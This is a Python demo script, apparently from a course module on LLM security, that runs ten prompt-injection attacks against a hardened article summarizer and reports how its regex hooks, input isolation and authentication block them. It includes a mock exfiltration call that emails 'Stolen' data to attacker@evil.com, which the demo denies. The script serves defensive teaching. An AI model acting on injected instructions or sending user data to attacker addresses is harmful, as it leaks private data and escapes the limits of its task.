"""
run_hardened.py -- Run all 10 attacks against the HARDENED app.

Demonstrates that the hardened summarizer blocks all injection attempts:
  - Pre-processing hook catches injection patterns (deterministic)
  - Input isolation separates instructions from data
  - Post-processing hook validates output (content policy)
  - Sensitive actions require authentication

Usage:
    uv run python .\\7_security_and_safety\\run_hardened.py
"""

from __future__ import annotations

import os
import sys

if sys.platform == "win32":
    sys.stdout.reconfigure(encoding="utf-8")
    sys.stderr.reconfigure(encoding="utf-8")

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from payloads import get_all_payloads
from hardened_app.summarizer import HardenedSummarizer
from hardened_app.actions import (
    send_email, delete_user_data, get_system_config,
    clear_audit_log, get_audit_log,
)


def main():
    print("\n" + "=" * 70)
    print("  MODULE 7: Security & Safety — Hardened App (Defense Demo)")
    print("=" * 70)

    live_mode = "--live" in sys.argv
    summarizer = HardenedSummarizer(live_mode=live_mode)
    mode_label = "LIVE" if live_mode else "MOCK"
    print(f"  Mode: {mode_label}")
    payloads = get_all_payloads()

    print(f"\n  Running {len(payloads)} injection attacks...\n")

    results = []

    for i, payload in enumerate(payloads, 1):
        result = summarizer.summarize(payload.article_text)
        succeeded = result["injection_result"]["injection_succeeded"]
        blocked_by = result["blocked_by"]

        status = "BLOCKED" if blocked_by else "SAFE"
        print(f"  Attack {i:>2}: [{status:>7}] {payload.name}")
        if blocked_by:
            hook_reason = result["hooks_fired"][0]["result"].get("reason", "")
            print(f"            Blocked by: {blocked_by}")
            print(f"            Reason: {hook_reason[:70]}")

        results.append({
            "payload": payload,
            "result": result,
            "blocked": blocked_by is not None,
        })

    # ── Summary ──
    blocked = sum(1 for r in results if r["blocked"])
    passed = len(results) - blocked

    print(f"\n  {'=' * 66}")
    print(f"  HARDENED APP RESULTS")
    print(f"  {'=' * 66}\n")
    print(f"  Total attacks:      {len(results)}")
    print(f"  Blocked by hooks:   {blocked} ← injection stopped")
    print(f"  Passed (safe):      {passed}")
    print(f"  Block rate:         {blocked / len(results):.0%}")

    # ── Sensitive action demo (with auth) ──
    clear_audit_log()

    print(f"\n  {'=' * 66}")
    print(f"  SENSITIVE ACTIONS (With Authentication)")
    print(f"  {'=' * 66}\n")

    # Attempt without token
    print("  --- No token (attacker scenario) ---")
    r1 = send_email("attacker@evil.com", "Stolen", "data", user_token=None)
    print(f"  send_email  → {r1['status']:>7} | {r1['reason']}")

    r2 = delete_user_data("user-123", user_token=None)
    print(f"  delete_data → {r2['status']:>7} | {r2['reason']}")

    # Attempt with wrong token
    print("\n  --- Invalid token ---")
    r3 = send_email("user@company.com", "Report", "data", user_token="fake_token")
    print(f"  send_email  → {r3['status']:>7} | {r3['reason']}")

    # Attempt with valid token but insufficient permissions
    print("\n  --- Valid token, insufficient permissions ---")
    r4 = delete_user_data("user-123", user_token="token_user_042")
    print(f"  delete_data → {r4['status']:>7} | {r4['reason']}")

    # Attempt with valid admin token
    print("\n  --- Valid admin token ---")
    r5 = send_email("team@company.com", "Weekly Report", "summary...", user_token="token_admin_001")
    print(f"  send_email  → {r5['status']:>7} | Sent by: {r5.get('sent_by', 'N/A')}")

    r6 = delete_user_data("user-456", user_token="token_admin_001")
    print(f"  delete_data → {r6['status']:>7} | Deleted by: {r6.get('deleted_by', 'N/A')}")

    # Config with masked secrets
    print("\n  --- System config (secrets masked) ---")
    r7 = get_system_config(user_token="token_admin_001")
    print(f"  api_key:   {r7.get('api_key', 'BLOCKED')}")
    print(f"  mode:      {r7.get('mode', 'N/A')}")

    # ── Audit trail ──
    print(f"\n  {'=' * 66}")
    print(f"  AUDIT TRAIL")
    print(f"  {'=' * 66}\n")

    audit = get_audit_log()
    for entry in audit:
        auth_mark = "✓" if entry["authorized"] else "✗"
        print(f"  [{auth_mark}] {entry['action']:>20} | "
              f"user={entry['user_id']:>22} | {entry['detail'][:40]}")

    # ── Guardrail type ──
    print(f"\n  {'=' * 66}")
    print(f"  GUARDRAIL ENFORCEMENT TYPE")
    print(f"  {'=' * 66}\n")
    print(f"  Injection detection:  CODE (regex patterns)  → deterministic")
    print(f"  Content policy:       CODE (regex patterns)  → deterministic")
    print(f"  Input isolation:      PROMPT (delimiters)    → probabilistic (backup)")
    print(f"  Role separation:      PROMPT (system prompt) → probabilistic (backup)")
    print(f"\n  Primary defense is deterministic (hooks).")
    print(f"  Prompt-based defenses are a secondary layer.")

    print(f"\n{'=' * 70}\n")

    return results


if __name__ == "__main__":
    main()
